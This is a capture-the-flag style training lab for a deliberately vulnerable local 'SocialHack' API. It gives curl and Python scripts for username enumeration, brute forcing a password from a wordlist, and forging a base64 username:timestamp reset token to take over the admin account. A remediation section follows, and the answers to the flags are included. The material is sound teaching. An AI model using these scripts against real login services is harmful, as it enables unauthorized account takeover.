# Lab 04: Broken Authentication

## Overview

| Field          | Details                                       |
|----------------|-----------------------------------------------|
| **Objective**  | Exploit authentication weaknesses              |
| **Difficulty** | ⭐⭐ Medium                                   |
| **Time**       | 60 minutes                                    |
| **Category**   | Authentication / Credential Attacks            |
| **OWASP**      | API2:2023 - Broken Authentication              |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5000`
- `curl` or an HTTP client
- Python 3 with the `requests` library installed
- Completion of Labs 01–02 (recommended)
- A password wordlist (a small one is provided below)

---

## Background

Broken authentication vulnerabilities allow attackers to compromise authentication tokens or exploit implementation flaws to assume other users' identities. Common weaknesses include:

- **Verbose error messages** that reveal whether a username exists
- **No rate limiting** on login endpoints, allowing brute force attacks
- **Predictable tokens** used for password resets
- **Weak JWT secrets** that allow token forgery

In this lab, you will exploit all four of these weaknesses in the SocialHack API to enumerate usernames, brute force passwords, forge password reset tokens, and ultimately take over the admin account.

**Password wordlist for brute force:**
```
123456
password
password123
admin123
letmein
welcome
monkey
dragon
master
qwerty
```

---

## Tasks

### Task 1: Enumerate Valid Usernames

The login endpoint returns different error messages for "user doesn't exist" vs "wrong password." Use this to discover valid usernames.

**Steps:**
1. Try to login with a non-existent username (e.g., `nonexistent`)
2. Try to login with an existing username but wrong password (e.g., `alice` / `wrongpass`)
3. Compare the error messages
4. Use this to test a list of potential usernames

**🚩 FLAG 1: What are the two different error messages?**

**curl examples:**
```bash
# Non-existent user
curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"test"}'

# Existing user, wrong password
curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"wrongpassword"}'
```

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

# Test non-existent user
r1 = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "nonexistent", "password": "test"})
print(f"Non-existent user: {r1.json()}")

# Test existing user with wrong password
r2 = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "alice", "password": "wrongpassword"})
print(f"Wrong password: {r2.json()}")

# Enumerate usernames
test_users = ["alice", "bob", "charlie", "admin", "root", "test", "john", "dave"]
print("\n--- Username Enumeration ---")
for user in test_users:
    r = requests.post(f"{BASE}/api/v1/auth/login",
        json={"username": user, "password": "wrongpassword"})
    msg = r.json().get("error", r.json().get("message", ""))
    exists = "not found" not in msg.lower()
    print(f"  {user}: {'EXISTS' if exists else 'NOT FOUND'} ({msg})")
```

<details>
<summary>💡 Hint 1</summary>
Pay attention to the exact wording of the error messages. They might differ by just a few words.
</details>

<details>
<summary>💡 Hint 2</summary>
One message says something like "User not found" while the other says "Wrong password" or "Invalid password".
</details>

<details>
<summary>💡 Hint 3</summary>
The API returns "User not found" when the username doesn't exist, and "Wrong password" (or "Invalid password") when the username exists but the password is wrong. This allows username enumeration.
</details>

---

### Task 2: Brute Force Alice's Password

With no rate limiting on the login endpoint, you can try many passwords quickly.

**Steps:**
1. Create a list of common passwords (use the wordlist provided above)
2. Send login requests for `alice` with each password
3. Identify the correct password
4. Note that no rate limiting or account lockout occurs

**Python example:**
```python
import requests

BASE = "http://localhost:5000"

passwords = [
    "123456", "password", "password123", "admin123", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty"
]

print("Brute forcing alice's password...")
for i, pwd in enumerate(passwords, 1):
    r = requests.post(f"{BASE}/api/v1/auth/login",
        json={"username": "alice", "password": pwd})
    if r.status_code == 200 and "token" in r.json():
        print(f"  [SUCCESS] Attempt {i}: password = '{pwd}'")
        break
    else:
        print(f"  [FAILED]  Attempt {i}: '{pwd}' - {r.json().get('error', 'N/A')}")
```

<details>
<summary>💡 Hint 1</summary>
Try common passwords from well-known wordlists like rockyou.txt. Alice uses a very common password.
</details>

<details>
<summary>💡 Hint 2</summary>
The password is in the provided wordlist. Try each one until you get a 200 response with a token.
</details>

<details>
<summary>💡 Hint 3</summary>
Alice's password is <code>password123</code>. The API never blocks you regardless of how many failed attempts you make.
</details>

---

### Task 3: Analyze Password Reset Tokens

The password reset mechanism uses predictable tokens. Understand the pattern.

**Steps:**
1. Request a password reset for alice: `POST /api/v1/auth/reset-password`
2. Capture the reset token from the response
3. Decode the token (it's base64 encoded)
4. Identify the pattern: what data is encoded in the token?

**🚩 FLAG 2: What is the format/structure of the reset token?**

**curl example:**
```bash
# Request password reset for alice
curl -s -X POST http://localhost:5000/api/v1/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"username":"alice"}'
```

**Python example:**
```python
import requests
import base64

BASE = "http://localhost:5000"

# Request password reset
r = requests.post(f"{BASE}/api/v1/auth/reset-password",
    json={"username": "alice"})
reset_data = r.json()
print(f"Reset response: {reset_data}")

# Get the reset token
token = reset_data.get("reset_token", reset_data.get("token", ""))
print(f"Reset token: {token}")

# Decode it (base64)
try:
    decoded = base64.b64decode(token).decode("utf-8")
    print(f"Decoded token: {decoded}")
except Exception as e:
    print(f"Decode error: {e}")
```

<details>
<summary>💡 Hint 1</summary>
The token looks like a base64-encoded string. Try decoding it.
</details>

<details>
<summary>💡 Hint 2</summary>
After base64 decoding, you should see a pattern like "username:something". What is the "something"?
</details>

<details>
<summary>💡 Hint 3</summary>
The reset token is base64 of <code>username:timestamp</code>. For example, <code>alice:1717257600</code> base64-encoded. The timestamp is the Unix epoch time when the reset was requested.
</details>

---

### Task 4: Forge a Reset Token for Admin

Now that you understand the token format, forge one for the admin account.

**Steps:**
1. Construct a token using the pattern: `admin:current_timestamp`
2. Base64 encode it
3. Use the forged token to reset the admin's password
4. Login with the new admin password

**🚩 FLAG 3: Successfully reset the admin's password and login**

**Python example:**
```python
import requests
import base64
import time

BASE = "http://localhost:5000"

# Step 1: Forge a reset token for admin
timestamp = int(time.time())
raw_token = f"admin:{timestamp}"
forged_token = base64.b64encode(raw_token.encode()).decode()
print(f"Forged token: {forged_token}")
print(f"Decoded: {raw_token}")

# Step 2: Use the forged token to reset admin's password
# (The exact endpoint/method depends on the API implementation)
r = requests.post(f"{BASE}/api/v1/auth/reset-password",
    json={
        "username": "admin",
        "token": forged_token,
        "new_password": "hacked123"
    })
print(f"Reset response: {r.json()}")

# Step 3: Login with the new password
r = requests.post(f"{BASE}/api/v1/auth/login",
    json={"username": "admin", "password": "hacked123"})
if r.status_code == 200:
    print(f"[SUCCESS] Logged in as admin!")
    print(f"Token: {r.json().get('token', 'N/A')[:50]}...")
else:
    print(f"[FAILED] {r.json()}")
```

<details>
<summary>💡 Hint 1</summary>
You need to create a token that matches the format the API expects: base64(username:timestamp).
</details>

<details>
<summary>💡 Hint 2</summary>
The timestamp should be close to the current time. Use <code>int(time.time())</code> in Python.
</details>

<details>
<summary>💡 Hint 3</summary>
Generate the forged token, then call the reset endpoint with the token and a new password. The API may accept the token if the timestamp is within a valid window. After resetting, login with the new password to confirm.
</details>

---

## Flags to Find

| Flag   | Description                                       | Hint                                   |
|--------|---------------------------------------------------|----------------------------------------|
| FLAG 1 | The two different error messages                  | "User not found" vs "Wrong password"   |
| FLAG 2 | The format of the reset token                     | base64(username:timestamp)             |
| FLAG 3 | Successfully reset admin's password and login     | Forge a token and reset               |

---

## Remediation

### 1. Use Generic Error Messages
```python
@app.route("/api/v1/auth/login", methods=["POST"])
def login():
    user = User.query.filter_by(username=data["username"]).first()
    if not user or not user.check_password(data["password"]):
        # Same message regardless of whether user exists or password is wrong
        return jsonify({"error": "Invalid credentials"}), 401
```

### 2. Implement Rate Limiting
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/api/v1/auth/login", methods=["POST"])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    # ... login logic
```

### 3. Use Cryptographically Secure Reset Tokens
```python
import secrets

def generate_reset_token():
    # Use secrets module — NOT predictable patterns
    return secrets.token_urlsafe(32)

def request_reset(username):
    token = generate_reset_token()
    # Store token with expiration in database
    ResetToken.create(user=username, token=token, expires=datetime.utcnow() + timedelta(hours=1))
    return token
```

### 4. Implement Account Lockout
```python
MAX_FAILED_ATTEMPTS = 5
LOCKOUT_DURATION = timedelta(minutes=15)

def check_lockout(username):
    failed = FailedLogin.query.filter_by(
        username=username,
        timestamp__gte=datetime.utcnow() - LOCKOUT_DURATION
    ).count()
    return failed >= MAX_FAILED_ATTEMPTS
```

### 5. Use Strong JWT Secrets
```python
import os
# Generate a strong random secret — never use a hardcoded value
JWT_SECRET = os.environ.get("JWT_SECRET", secrets.token_hex(32))
```

### 6. OWASP Recommendations
- **API2:2023**: Treat login, password reset, and token refresh as sensitive endpoints. Apply strict rate limiting. Use generic error messages. Use cryptographically strong tokens.

---

## References

- [OWASP API Security Top 10 - API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-640: Weak Password Recovery Mechanism](https://cwe.mitre.org/data/definitions/640.html)
- [NIST SP 800-63B: Digital Identity Guidelines - Authentication](https://pages.nist.gov/800-63-3/sp800-63b.html)
